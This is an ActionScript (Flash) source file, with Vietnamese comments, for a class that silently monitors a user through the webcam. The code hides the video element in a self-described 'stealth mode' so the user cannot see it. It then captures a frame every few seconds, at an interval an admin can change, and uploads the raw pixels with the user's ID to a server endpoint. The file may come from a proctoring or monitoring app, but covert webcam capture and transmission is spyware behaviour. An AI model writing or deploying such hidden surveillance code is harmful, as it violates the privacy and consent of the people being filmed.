package {
	import flash.display.Sprite;
	import flash.media.Camera;
	import flash.media.Video;
	import flash.utils.Timer;
	import flash.events.TimerEvent;
	import flash.display.BitmapData;
	import flash.utils.ByteArray;
	import flash.net.URLRequest;
	import flash.net.URLRequestMethod;
	import flash.net.URLLoader;
	import flash.events.Event;
	import flash.events.IOErrorEvent;

	public class CameraMonitor extends Sprite {

		private var cam: Camera;
		private var vid: Video;
		private var timer: Timer;

		private var serverURL: String;
		private var userID: int;
		private var w: int = 320;
		private var h: int = 240;

		public function CameraMonitor(svURL: String = "http://127.0.0.1:5000", uid: int = -1) {
			this.serverURL = svURL;
			this.userID = uid;

			initCamera();
		}

		// --- CẬP NHẬT USER ID ---
		public function updateUserID(newID: int): void {
			this.userID = newID;
			trace("📷 CameraMonitor: Đã cập nhật User ID = " + newID);
		}

		// --- [MỚI] CẬP NHẬT THỜI GIAN CHỤP (TỪ SETTING ADMIN) ---
		// Thêm/Sửa hàm này trong file CameraMonitor.as
		public function setTimerDelay(seconds: int): void {
			// Nếu timer chưa khởi tạo thì thôi
			if (timer) {
				// Đổi giây sang mili-giây (Ví dụ: 5 giây -> 5000 ms)
				// Chặn lỗi nếu Admin nhập số 0 hoặc số âm
				var ms: int = (seconds < 1) ? 1000 : (seconds * 1000);

				timer.stop(); // 1. Dừng nhịp cũ
				timer.delay = ms; // 2. Gán nhịp mới
				timer.reset(); // 3. Reset bộ đếm
				timer.start(); // 4. Bắt đầu lại

				trace("⏱️ CameraMonitor: Đã đổi tần suất chụp thành " + seconds + " giây (" + ms + "ms).");
			}
		}

		private function initCamera(): void {
			if (Camera.names.length == 0) {
				trace("⚠️ CameraMonitor: Không tìm thấy Webcam!");
				return;
			}

			cam = Camera.getCamera();
			if (cam) {
				// Cấu hình Camera nhẹ
				cam.setMode(w, h, 15);

				// Tạo Video để chứa luồng Camera (Bắt buộc phải có để chụp ảnh)
				vid = new Video(w, h);
				vid.attachCamera(cam);

				// --- STEALTH MODE (CHẾ ĐỘ TÀNG HÌNH) ---
				// Vẫn add vào DisplayList để đảm bảo hoạt động ổn định
				addChild(vid);

				// NHƯNG ẩn nó đi để người dùng không thấy
				vid.visible = false;

				// (Đã bỏ đoạn vẽ khung đỏ lineStyle/drawRect)
				// ----------------------------------------

				// Timer mặc định (sẽ bị ghi đè khi đăng nhập thành công)
				timer = new Timer(5000);
				timer.addEventListener(TimerEvent.TIMER, onTick);
				timer.start();

				trace("✅ CameraMonitor: Đã khởi động ngầm (Stealth Mode).");
			}
		}

		private function onTick(e: TimerEvent): void {
			// Chỉ gửi ảnh nếu User đã đăng nhập
			if (userID == -1) return;
			uploadPhoto();
		}

		private function uploadPhoto(): void {
			// 1. Chụp hình (Vẫn chụp được kể cả khi vid.visible = false)
			var bmd: BitmapData = new BitmapData(w, h);
			bmd.draw(vid);

			// 2. Lấy dữ liệu thô
			var bytes: ByteArray = bmd.getPixels(bmd.rect);

			// 3. Gửi Server
			var api: String = serverURL + "/api/upload_photo?uid=" + userID + "&w=" + w + "&h=" + h;
			var req: URLRequest = new URLRequest(api);
			req.method = URLRequestMethod.POST;
			req.contentType = "application/octet-stream";
			req.data = bytes;

			var loader: URLLoader = new URLLoader();
			loader.addEventListener(Event.COMPLETE, onSuccess);
			loader.addEventListener(IOErrorEvent.IO_ERROR, onFail);
			loader.load(req);
		}

		private function onSuccess(e: Event): void {
			// trace("📤 Gửi ảnh OK"); // Bỏ comment nếu muốn debug
		}

		private function onFail(e: IOErrorEvent): void {
			trace("❌ CameraMonitor: Lỗi kết nối Server.");
		}
	}
}